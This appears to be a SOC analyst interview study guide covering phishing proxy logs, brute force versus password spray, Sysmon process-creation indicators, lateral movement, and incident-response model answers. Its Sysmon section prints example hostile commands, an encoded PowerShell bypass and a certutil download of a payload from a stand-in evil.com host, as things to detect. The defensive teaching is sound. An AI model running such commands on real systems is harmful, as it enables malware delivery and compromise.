3. THE 4 LOG SCENARIOS EVERY CAMPUS INTERVIEWER ASKS ABOUT
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
SCENARIO 1: Web Proxy / Gateway Logs (The Phishing Pivot)
--------------------------------------------------------------------------------
What the log looks like:
  2026-10-23 14:22:01 192.168.1.45 GET okokoaksoa.z13.web.core.windows.net/login 200 4520 Mozilla/5.0
  2026-10-23 14:22:30 192.168.1.45 POST okokoaksoa.z13.web.core.windows.net/submit 302 512 Mozilla/5.0

How you explain it to the interviewer:
  "The log shows internal workstation 192.168.1.45 issued an outbound GET request
   to the malicious Azure domain identified in our email triage. 
   HTTP status 200 indicates the phishing landing page loaded successfully.
   29 seconds later, the user issued an HTTP POST request to /submit with a 302 redirect.
   This indicates the user likely submitted credentials into the fake login form.
   Action: Immediately isolate 192.168.1.45 from the network, initiate an emergency 
   password reset on the user's Active Directory and M365 accounts, and revoke all 
   active session tokens."

--------------------------------------------------------------------------------
SCENARIO 2: Windows Authentication Logs (Brute Force vs Password Spray)
--------------------------------------------------------------------------------
Key Event IDs:
  - Event ID 4625: An account failed to log on.
  - Event ID 4624: An account was successfully logged on.

How you explain the difference:
  - Brute Force:
    "A single account (e.g., 'administrator') experiences 200 failed logons (Event 4625) 
     within 60 seconds from an external IP, immediately followed by Event 4624 (success).
     This is a targeted dictionary attack against one account."
  - Password Spray:
    "An attacker attempts 1 logon attempt (Event 4625) using a common password like 
     'Company2024!' across 300 different usernames within 15 minutes. 
     This is specifically designed to stay under the account lockout threshold (e.g., 5 attempts)."

--------------------------------------------------------------------------------
SCENARIO 3: Endpoint / Sysmon Logs (Suspicious Process Execution & LOLBins)
--------------------------------------------------------------------------------
Key Event ID:
  - Event ID 1: Process Creation.

What to look for:
  - Office or PDF applications spawning command shells or downloaders:
    Parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    Child:  powershell.exe -ExecutionPolicy Bypass -NoP -enc aQB3AHIA...
    Child:  cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/payload.exe

How you explain it to the interviewer:
  "Under normal enterprise operations, productivity applications (Word, Excel, Acrobat) 
   should NEVER spawn interactive scripting interpreters (powershell, cmd, wscript, cscript) 
   or Living-off-the-Land Binaries (LOLBins like certutil, bitsadmin). 
   This behavior indicates weaponized macro execution, buffer overflow exploitation, 
   or an embedded OLE object."

--------------------------------------------------------------------------------
SCENARIO 4: Network / Firewall Logs (Scanning vs Lateral Movement)
--------------------------------------------------------------------------------
What to look for:
  - External Scanning:
    A single external IP sending rapid TCP SYN packets across ports 21, 22, 80, 443, 3389, 8080.
  - Internal Lateral Movement:
    An internal workstation (e.g., 10.0.1.20) suddenly sending large volumes of traffic 
    to multiple internal peer workstations over Port 445 (SMB / PsExec) or Port 135 (RPC / WMI).

How you explain it to the interviewer:
  "Workstation-to-workstation traffic on port 445 is abnormal in a well-segmented network. 
   If endpoint A connects to endpoints B, C, and D over port 445 after a phishing alert, 
   this indicates lateral movement using stolen administrative credentials or tools like 
   PsExec and Impacket."

5. COMMON SOC INTERVIEW QUESTIONS & MODEL ANSWERS
--------------------------------------------------------------------------------

Q1: "What is the difference between Email Analysis and Log Analysis?"
Answer:
  "Email analysis is forensic artifact analysis—we deconstruct an inbound lure, evaluate 
   SPF/DKIM/DMARC headers, isolate attachments, and extract Indicators of Compromise (IOCs). 
   Log analysis is impact and blast-radius analysis—we take those IOCs and search proxy, DNS, 
   and endpoint authentication logs across the SIEM to verify whether any internal user clicked 
   the lure, loaded the site, or executed secondary payloads."

Q2: "What is the difference between a True Positive and a False Positive?"
Answer:
  "A True Positive occurs when an alert fires on actual malicious or unauthorized activity 
   (e.g., an internal user connecting to a known phishing domain). 
   A False Positive occurs when an alert fires on benign activity that matches a detection pattern 
   (e.g., an internal vulnerability scanner triggering a port-scan alert, or an IT administrator 
   running remote PowerShell scripts triggering a LOLBin alert).
   In a SOC, high false-positive rates cause alert fatigue, which is why detection rules must be 
   continually tuned with precise decoders and whitelists."

Q3: "Walk me through the steps if an alert triggers for a user clicking a phishing link."
Answer:
  "I follow the PICERL incident response lifecycle:
   1. Identification: Validate the alert in the SIEM, verify the HTTP status code (200 vs 403), 
      and check if an HTTP POST occurred indicating credential submission.
   2. Containment: Immediately isolate the affected endpoint from the network via EDR/Wazuh. 
      Initiate an emergency password reset for the user and revoke all active cloud sessions. 
      Block the malicious domain at the perimeter firewall and web proxy.
   3. Eradication: Purge the phishing email from all user mailboxes across the organization 
      using M365 Security & Compliance search. Remove any cached artifacts or downloaded payloads.
   4. Recovery: Scan the isolated endpoint with full EDR/antivirus, verify no persistence mechanisms 
      exist (scheduled tasks, run keys), and restore network connectivity.
   5. Lessons Learned: Document the incident report with full timeline, IOCs, and update our 
      SIEM detection lists and email gateway rules to prevent similar lures."
